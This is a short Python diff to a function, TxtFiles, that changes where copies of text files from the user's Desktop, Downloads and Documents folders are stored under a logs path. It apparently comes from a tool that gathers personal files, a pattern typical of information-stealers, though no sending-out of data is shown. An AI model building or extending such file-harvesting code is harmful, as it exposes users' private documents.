@@ -18,7 +18,7 @@ def copy_txt_files(source_folder, destination_folder):
 def TxtFiles():
     Log("===========TxtFiles===========")
     user = environ["USERPROFILE"]
-    dest_folder = join(user, config.pathToLogs, "Files")
+    dest_folder = join(config.pathToLogs, "Files")
     desktop = join(dest_folder, "Desktop")
     downloads = join(dest_folder, "Downloads")
     documents = join(dest_folder, "Documents")
